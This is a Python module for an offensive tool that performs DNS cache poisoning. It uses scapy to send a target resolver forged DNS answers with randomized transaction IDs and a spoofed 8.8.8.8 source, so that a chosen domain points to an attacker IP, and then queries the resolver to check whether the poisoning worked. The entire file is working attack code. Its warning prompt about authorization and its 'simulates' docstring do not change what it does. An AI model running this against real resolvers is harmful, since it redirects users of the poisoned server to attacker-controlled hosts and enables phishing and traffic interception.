import socket
import struct
import random
import time
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress

class DNSCachePoisoning:
    """ 
    this class simulates cache poisoning by forging dns responses targeted at a dns resolver, attempting to redirect legitimate domain lookups to an attacker-controlled ip address
    """
    description = "DNS cache poisoning and spoofing attacks"
    
    def __init__(self):
        """ 
        initialize the module 
        """
        self.console = Console()
        self.target_dns_server = None
        self.target_domain = None
        self.malicious_ip = None
        
    def run(self):
        """ 
        asks user for configuration, displays selected parameters, asks for authorization confirmation, and triggers the poisoning process
        """
        try:
            self.console.print(
                Panel.fit(
                    "[bold blue]Starting DNS Cache Poisoning Attack[/bold blue]",
                    title="[bold white]DNS Poisoner[/bold white]"
                )
            )
            
            config = self._get_attack_config()
            self.target_dns_server = config['dns_server']
            self.target_domain = config['domain']
            self.malicious_ip = config['malicious_ip']
            
            self.console.print(
                Panel.fit(
                    f"[yellow]Target DNS:[/yellow] {self.target_dns_server}\n"
                    f"[yellow]Domain to poison:[/yellow] {self.target_domain}\n"
                    f"[yellow]Redirect to:[/yellow] {self.malicious_ip}",
                    title="[bold yellow]Attack Configuration[/bold yellow]"
                )
            )
            
            if not self._confirm_attack():
                return
            
            self._perform_dns_poisoning()
            
        except Exception as e:
            self.console.print(
                Panel.fit(
                    f"[bold red]DNS poisoning failed: {e}[/bold red]",
                    title="[bold red]Attack Failed[/bold red]"
                )
            )
    
    def _get_attack_config(self):
        """ 
        get attack config from user, dns server ip, domain, and malicious ip
        """
        self.console.print("\n[bold]DNS Poisoning Configuration[/bold]")
        
        dns_server = self.console.input("[cyan]Target DNS server IP[/cyan]: ").strip()
        domain = self.console.input("[cyan]Domain to poison[/cyan] (e.g., example.com): ").strip()
        malicious_ip = self.console.input("[cyan]Malicious IP for redirection[/cyan]: ").strip()
        
        return {
            'dns_server': dns_server,
            'domain': domain,
            'malicious_ip': malicious_ip
        }
    
    def _confirm_attack(self):
        """ 
        double check with the user if they want to run the attack
        """
        confirm = self.console.input(
            "\n[bold red]WARNING: This attack may be illegal without proper authorization. Continue?[/bold red] (y/N): "
        ).strip().lower()
        return confirm == 'y'
    
    def _perform_dns_poisoning(self):
        """
        start dns cache poisoning attempt by generating multiple forged dns responses using randomized transaction IDs. Displays progress, handles packet dispatch failures, and triggers a verification routine after completion
        """
        self.console.print("\n[bold]Starting DNS Cache Poisoning...[/bold]")
        
        transaction_ids = [random.randint(1, 65535) for _ in range(100)]
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Sending poisoned DNS responses...", total=len(transaction_ids))
            
            for txid in transaction_ids:
                try:
                    self._send_poisoned_response(txid)
                    progress.update(task, advance=1)
                    time.sleep(0.1)
                except Exception as e:
                    self.console.print(f"[yellow]Failed to send packet with TXID {txid}: {e}[/yellow]")
        
        self.console.print(
            Panel.fit(
                "[green]DNS poisoning packets sent successfully[/green]",
                title="[bold green]Attack Complete[/bold green]"
            )
        )
        
        self._verify_poisoning()
    
    def _send_poisoned_response(self, transaction_id):
        """
        create a forged dns response packet to the target dns server intended to poison its cache by associating a malicious IP with the victim domain
        """
        ip = IP(dst=self.target_dns_server, src="8.8.8.8")  #spoofed source google dns you can change this to cloudflare (1.1.1.1) or whatever dns you like
        
        udp = UDP(dport=53, sport=53)
        
        dns = DNS(
            id=transaction_id,
            qr=1,  # Response
            aa=0,
            tc=0,
            rd=1,
            ra=1,
            z=0,
            rcode=0,
            qd=DNSQR(qname=self.target_domain, qtype="A", qclass="IN"),
            an=DNSRR(
                rrname=self.target_domain,
                type="A",
                rclass="IN",
                ttl=300,  # TTL is in seconds 300s=5mins
                rdata=self.malicious_ip
            ),
            ar=DNSRR(
                rrname=self.target_domain,
                type="A",
                rclass="IN", 
                ttl=300,
                rdata=self.malicious_ip
            )
        )
        
        packet = ip/udp/dns
        send(packet, verbose=0)
    
    def _verify_poisoning(self):
        """
        query the victim dns server to determine whether cache pollution was successful. Displays resulting resource records in a formatted table
        """
        self.console.print("\n[bold]Verifying DNS cache poisoning...[/bold]")
        
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.target_dns_server]
            
            answers = resolver.resolve(self.target_domain, 'A')
            
            table = Table(show_header=True, title="DNS Query Results")
            table.add_column("Record Type", style="cyan")
            table.add_column("IP Address", style="white")
            table.add_column("Status", style="white")
            
            for answer in answers:
                status = "[green]POISONED[/green]" if str(answer) == self.malicious_ip else "[yellow]CLEAN[/yellow]"
                table.add_row("A", str(answer), status)
            
            self.console.print(table)
            
        except Exception as e:
            self.console.print(f"[yellow]Verification failed: {e}[/yellow]")
